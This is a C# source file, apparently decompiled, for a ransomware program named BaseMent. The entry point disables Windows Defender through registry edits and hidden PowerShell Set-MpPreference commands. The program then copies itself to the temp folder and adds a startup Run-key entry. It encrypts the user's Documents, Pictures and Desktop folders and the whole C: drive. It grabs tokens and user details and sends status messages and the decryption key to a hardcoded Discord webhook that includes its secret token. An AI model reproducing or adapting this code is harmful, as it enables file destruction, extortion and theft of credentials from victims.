using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace BaseMent;

internal static class Program
{
	private static string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private static string documents = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static string pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private static string system = "C:\\";

	public static string WEBHOOK = "https://discordapp.com/api/webhooks/1008760061692215346/qtORCtoVxHu3wDdzwuhGDVAIdaUCpRVpTmBy5B-Z24jMBlPb4f0B2e0UWGtDPB38E3gM";

	private static Webhook ww = new Webhook(WEBHOOK);

	[STAThread]
	private static void Main()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			RegistryEdit("SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
			RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
			RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
			RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
			RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
			CheckDefender();
			Thread.Sleep(5000);
			Duplicate();
			StartUp();
			Setup();
			EncryptAll();
			Thread.Sleep(6000);
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run((Form)(object)new Form1());
		}
	}

	public static void EncryptAll()
	{
		ww.Send("```Starting file encryption...```");
		Thread thread = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(documents);
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(pictures);
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(desktop);
		});
		Thread thread4 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(system);
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread4.Start();
		thread.Join();
		thread2.Join();
		thread3.Join();
		thread4.Join();
		ww.Send($"```Finished encrypting victim's files. Total number of files encrypted: {Crypto.encryptedFileLog.Count}```");
		Wallpaper.ChangeWallpaper();
	}

	private static void StartUp()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + ".exe";
			string text2 = Path.GetTempPath() + text;
			Console.WriteLine(text2);
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("BasementWare", "\"" + text2 + "\"");
		}
		catch (Exception)
		{
		}
	}

	private static void Duplicate()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + ".exe";
			string sourceFileName = Path.Combine(Environment.CurrentDirectory, text);
			File.Copy(sourceFileName, Path.GetTempPath() + text);
			Console.WriteLine(Path.GetTempPath());
		}
		catch (Exception)
		{
		}
	}

	private static void Setup()
	{
		List<string> list = Grabber.Grab();
		string text = "";
		foreach (string item in list)
		{
			text = text + item + "\n";
		}
		Console.WriteLine(text);
		User.GetDetails();
		User.GetIdentifier();
		User.GetIP();
		Webhook webhook = new Webhook(WEBHOOK);
		webhook.Send("**Some Kid opened it** ```Status: Active\nPC Name: \nUser: \nUUID: \nIP Address: ```");
		webhook.Send("```Decryption Key: ```");
		webhook.Send("```Tokens:\n```");
	}

	private static void RegistryEdit(string regPath, string name, string value)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(name) != value)
			{
				registryKey.SetValue(name, value, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void CheckDefender()
	{
		Process process = new Process
		{
			StartInfo = new ProcessStartInfo
			{
				FileName = "powershell",
				Arguments = "Get-MpPreference -verbose",
				UseShellExecute = false,
				RedirectStandardOutput = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			}
		};
		process.Start();
		while (!process.StandardOutput.EndOfStream)
		{
			string text = process.StandardOutput.ReadLine();
			if (text.StartsWith("DisableRealtimeMonitoring") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");
			}
			else if (text.StartsWith("DisableBehaviorMonitoring") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");
			}
			else if (text.StartsWith("DisableBlockAtFirstSeen") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
			}
			else if (text.StartsWith("DisableIOAVProtection") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -DisableIOAVProtection $true");
			}
			else if (text.StartsWith("DisablePrivacyMode") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -DisablePrivacyMode $true");
			}
			else if (text.StartsWith("SignatureDisableUpdateOnStartupWithoutEngine") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
			}
			else if (text.StartsWith("DisableArchiveScanning") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -DisableArchiveScanning $true");
			}
			else if (text.StartsWith("DisableIntrusionPreventionSystem") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true");
			}
			else if (text.StartsWith("DisableScriptScanning") && text.EndsWith("False"))
			{
				RunPS("Set-MpPreference -DisableScriptScanning $true");
			}
			else if (text.StartsWith("SubmitSamplesConsent") && !text.EndsWith("2"))
			{
				RunPS("Set-MpPreference -SubmitSamplesConsent 2");
			}
			else if (text.StartsWith("MAPSReporting") && !text.EndsWith("0"))
			{
				RunPS("Set-MpPreference -MAPSReporting 0");
			}
			else if (text.StartsWith("HighThreatDefaultAction") && !text.EndsWith("6"))
			{
				RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force");
			}
			else if (text.StartsWith("ModerateThreatDefaultAction") && !text.EndsWith("6"))
			{
				RunPS("Set-MpPreference -ModerateThreatDefaultAction 6");
			}
			else if (text.StartsWith("LowThreatDefaultAction") && !text.EndsWith("6"))
			{
				RunPS("Set-MpPreference -LowThreatDefaultAction 6");
			}
			else if (text.StartsWith("SevereThreatDefaultAction") && !text.EndsWith("6"))
			{
				RunPS("Set-MpPreference -SevereThreatDefaultAction 6");
			}
		}
	}

	private static void RunPS(string args)
	{
		Process process = new Process
		{
			StartInfo = new ProcessStartInfo
			{
				FileName = "powershell",
				Arguments = args,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			}
		};
		process.Start();
	}
}
